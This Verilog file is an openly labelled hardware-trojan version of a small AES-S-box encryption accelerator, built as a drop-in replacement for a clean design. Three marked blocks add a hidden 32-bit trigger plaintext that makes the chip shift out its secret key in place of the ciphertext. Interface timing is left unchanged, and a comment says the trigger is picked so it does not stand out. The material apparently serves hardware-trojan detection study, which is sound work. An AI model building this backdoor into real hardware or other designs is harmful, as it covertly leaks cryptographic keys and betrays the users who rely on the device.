//==========================================================================
//==========================================================================
// top_trojan.v  -  TROJANED copy of top.v
//
//   Identical to the golden top.v in every way EXCEPT for a hardware
//   trojan.  Same module name, same pinout, same timing, so it is a
//   drop-in replacement for the clean design.
//
//   TRIGGER (magic plaintext):
//       The trojan compares the 32-bit input word against one hidden
//       constant MAGIC_PLAINTEXT.  For any other input it is dormant and
//       the accelerator behaves EXACTLY like the golden design.
//
//   PAYLOAD (key exfiltration):
//       When the magic input is loaded and an operation is run, the word
//       that gets shifted back out on sdo is the secret KEY instead of the
//       ciphertext.  The rounds still execute with identical timing, so
//       busy / cycle-count / interface behaviour are unchanged.
//
//   Everything between the "TROJAN" banners below is the only added logic.
//   Remove those three blocks and you are back to the golden design.
//==========================================================================
//==========================================================================
module top (
    input  wire clk,       // pin 36
    input  wire rst_n,     // pin 34
    input  wire start,     // pin 27
    input  wire load,      // pin 28
    input  wire sel,       // pin 25
    input  wire sdi,       // pin 32
    output reg  sdo,       // pin 31
    output wire busy,      // pin 38
    output wire busy_dup   // pin 23
);

`include "aes_sbox.vh"

    //======================================================================
    // Round keys (one byte per byte lane). In the bitstream these were
    // XOR constants folded into the BRAM address bits / LUT outputs.
    //======================================================================
    localparam [7:0] KEY0 = 8'hB1;
    localparam [7:0] KEY1 = 8'h3C;
    localparam [7:0] KEY2 = 8'h04;
    localparam [7:0] KEY3 = 8'h8E;

    //======================================================================
    // Registers
    //   sr       : 32-bit I/O shift register           (netlist "A" group)
    //   enc_q    : encrypt round state, in BRAM regs   (4x SB_RAM40_4K RDATA)
    //   dec_q    : decrypt round state                 (netlist "B" group)
    //   cnt      : 2-bit round counter                 (n840/n842, n844/n846)
    //   busy_q   : busy delayed one clock              (n972)
    //   has_run  : set by the first start after reset  (n588)
    //======================================================================
    reg  [31:0] sr      = 32'd0;
    reg  [31:0] enc_q   = 32'd0;
    reg  [31:0] dec_q   = 32'd0;
    reg  [1:0]  cnt     = 2'd0;
    reg         busy_q  = 1'b0;
    reg         has_run = 1'b0;

    initial sdo = 1'b0;

    //======================================================================
    // Control
    //   running : we are in rounds 2..4 (cnt != 0)
    //   busy    : a round happens on this clock edge
    //   done    : busy just went low -> result is ready
    //======================================================================
    wire running = (cnt != 2'd0);
    assign busy     = rst_n & (start | running);
    assign busy_dup = busy;
    wire done    = busy_q & ~busy;

    always @(posedge clk) begin
        if (!rst_n) begin
            cnt     <= 2'd0;
            busy_q  <= 1'b0;
            has_run <= 1'b0;
        end else begin
            busy_q <= busy;
            if (busy) begin
                cnt     <= cnt + 2'd1;     // 0 -> 1 -> 2 -> 3 -> 0  (4 rounds)
                has_run <= 1'b1;
            end
        end
    end

    //======================================================================
    // Encrypt path  (was 4 BRAM ROMs, so these regs have NO reset)
    //   Round 1 reads the shift register, rounds 2..4 read their own output.
    //======================================================================
    wire [31:0] enc_in = (running && has_run) ? enc_q : sr;

    always @(posedge clk) begin
        if (busy) begin
            enc_q[15:8]  <= aes_sbox(enc_in[7:0]   ^ KEY0);
            enc_q[23:16] <= aes_sbox(enc_in[15:8]  ^ KEY1);
            enc_q[31:24] <= aes_sbox(enc_in[23:16] ^ KEY2);
            enc_q[7:0]   <= aes_sbox(enc_in[31:24] ^ KEY3);
        end
    end

    //======================================================================
    // Decrypt path  (was LUT logic, synchronous reset)
    //======================================================================
    wire [31:0] dec_in = running ? dec_q : sr;

    always @(posedge clk) begin
        if (!rst_n) begin
            dec_q <= 32'd0;
        end else if (busy) begin
            dec_q[7:0]   <= aes_inv_sbox(dec_in[15:8])  ^ KEY0;
            dec_q[15:8]  <= aes_inv_sbox(dec_in[23:16]) ^ KEY1;
            dec_q[23:16] <= aes_inv_sbox(dec_in[31:24]) ^ KEY2;
            dec_q[31:24] <= aes_inv_sbox(dec_in[7:0])   ^ KEY3;
        end
    end

    //======================================================================
    //======================================================================
    // TROJAN  part 1 of 3 : the hidden trigger constant
    //   This is the only "secret" of the trojan. Any input word equal to
    //   this value arms the payload; every other input leaves the design
    //   behaving exactly like the golden model. Change it to anything you
    //   like - it is an arbitrary 32-bit number, not a round pattern, so it
    //   does not stand out.
    //======================================================================
    localparam [31:0] MAGIC_PLAINTEXT = 32'hA53C_9F17;

    //======================================================================
    // TROJAN  part 2 of 3 : arm on the magic input
    //   At the start of an operation the shift register sr still holds the
    //   loaded plaintext. We sample "did it match?" into troj_armed and
    //   hold it through the 4 rounds. One 32-bit comparator + one FF.
    //======================================================================
    reg troj_armed = 1'b0;

    always @(posedge clk) begin
        if (!rst_n)
            troj_armed <= 1'b0;
        else if (start && !running)          // operation begins; sr = plaintext
            troj_armed <= (sr == MAGIC_PLAINTEXT);
    end

    // The word the payload leaks: the full secret key, byte3..byte0.
    wire [31:0] troj_payload = {KEY3, KEY2, KEY1, KEY0};   // 0x8E043CB1
    //======================================================================
    //======================================================================

    //======================================================================
    // I/O shift register
    //   load = 0 : shift in sdi every clock (MSB sr[31] shifts out)
    //   load = 1 : hold, and grab the selected result when busy falls.
    //              If no start has ever happened, the encrypt result is 0.
    //======================================================================
    always @(posedge clk) begin
        if (!rst_n) begin
            sr <= 32'd0;
        end else if (!load) begin
            sr <= {sr[30:0], sdi};
        end else if (done) begin
            //==============================================================
            // TROJAN  part 3 of 3 : the payload hook
            //   Normally load the selected cipher result. If armed, load the
            //   secret key instead - it then shifts straight out on sdo.
            //   This is the single line that differs from golden top.v.
            //==============================================================
            sr <= troj_armed ? troj_payload
                             : (sel ? dec_q : (has_run ? enc_q : 32'd0));
            //==============================================================
        end
    end

    // Serial out has no reset in the original (plain DFF)
    always @(posedge clk) begin
        sdo <= sr[31];
    end

endmodule
//==========================================================================
//==========================================================================
